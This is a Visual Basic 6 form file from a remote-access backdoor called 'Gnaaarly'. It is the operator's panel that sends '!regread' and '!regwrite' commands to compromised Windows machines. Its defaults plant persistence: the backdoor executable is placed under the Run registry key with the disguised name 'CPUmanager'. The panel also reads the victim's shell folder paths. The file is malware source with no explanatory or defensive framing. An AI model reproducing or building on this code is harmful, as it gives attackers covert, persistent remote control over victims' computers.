VERSION 5.00
Begin VB.Form frmRegistry 
   BorderStyle     =   4  'Festes Werkzeugfenster
   Caption         =   "Gnaaarly Backdoor - Registry Commands"
   ClientHeight    =   4920
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   5535
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4920
   ScaleWidth      =   5535
   StartUpPosition =   2  'Bildschirmmitte
   Begin VB.CommandButton cmdBack 
      Caption         =   "BACK"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   120
      TabIndex        =   13
      Top             =   4440
      Width           =   5295
   End
   Begin VB.Frame fraRegRead 
      Caption         =   "READ STRING FROM REGISTRY"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1935
      Left            =   0
      TabIndex        =   7
      Top             =   2400
      Width           =   5535
      Begin VB.CommandButton cmdRead 
         Caption         =   "READ"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   12
         Top             =   1560
         Width           =   5295
      End
      Begin VB.TextBox txtValueName2 
         Appearance      =   0  '2D
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   960
         TabIndex        =   11
         Text            =   "Personal"
         Top             =   1200
         Width           =   4455
      End
      Begin VB.TextBox txtSubkey2 
         Appearance      =   0  '2D
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   960
         TabIndex        =   10
         Text            =   "Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
         Top             =   840
         Width           =   4455
      End
      Begin VB.ComboBox comHkey2 
         Appearance      =   0  '2D
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   345
         Left            =   960
         TabIndex        =   9
         Text            =   "HKEY..."
         Top             =   360
         Width           =   4455
      End
      Begin VB.Label lblRegRead 
         Caption         =   "!regread"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   8
         Top             =   360
         Width           =   735
      End
   End
   Begin VB.Frame fraRegWrite 
      Caption         =   "WRITE STRING TO REGISTRY"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2295
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   5535
      Begin VB.CommandButton cmdWrite 
         Caption         =   "WRITE"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   6
         Top             =   1920
         Width           =   5295
      End
      Begin VB.TextBox txtValue 
         Appearance      =   0  '2D
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   960
         TabIndex        =   5
         Text            =   "C:\Windows\Gnaaarly.exe"
         Top             =   1560
         Width           =   4455
      End
      Begin VB.TextBox txtValueName 
         Appearance      =   0  '2D
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   960
         TabIndex        =   4
         Text            =   "CPUmanager"
         Top             =   1200
         Width           =   4455
      End
      Begin VB.TextBox txtSubkey 
         Appearance      =   0  '2D
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   960
         TabIndex        =   3
         Text            =   "Software\Microsoft\Windows\CurrentVersion\Run"
         Top             =   840
         Width           =   4455
      End
      Begin VB.ComboBox comHkey 
         Appearance      =   0  '2D
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   345
         Left            =   960
         TabIndex        =   2
         Text            =   "HKEY..."
         Top             =   360
         Width           =   4455
      End
      Begin VB.Label lblRegWrite 
         Caption         =   "!regwrite"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   1
         Top             =   360
         Width           =   735
      End
   End
End
Attribute VB_Name = "frmRegistry"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cmdBack_Click()
    frmRegistry.Hide
End Sub

Private Sub cmdRead_Click()
    frmMain.txtSend.Text = "!regread '" & comHkey2.List(comHkey2.ListIndex) & "' '" & txtSubkey2.Text & "' '" & txtValueName2.Text & "'"
    SendCommand
End Sub

Private Sub cmdWrite_Click()
    frmMain.txtSend.Text = "!regwrite '" & comHkey.List(comHkey.ListIndex) & "' '" & txtSubkey.Text & "' '" & txtValueName.Text & "' '" & txtValue.Text & "'"
    SendCommand
End Sub

Private Sub Form_Load()
    comHkey.AddItem "HKEY_LOCAL_MACHINE"
    comHkey.AddItem "HKEY_CLASSES_ROOT"
    comHkey.AddItem "HKEY_CURRENT_USER"
    comHkey.AddItem "HKEY_USERS"
    comHkey2.AddItem "HKEY_LOCAL_MACHINE"
    comHkey2.AddItem "HKEY_CLASSES_ROOT"
    comHkey2.AddItem "HKEY_CURRENT_USER"
    comHkey2.AddItem "HKEY_USERS"
End Sub
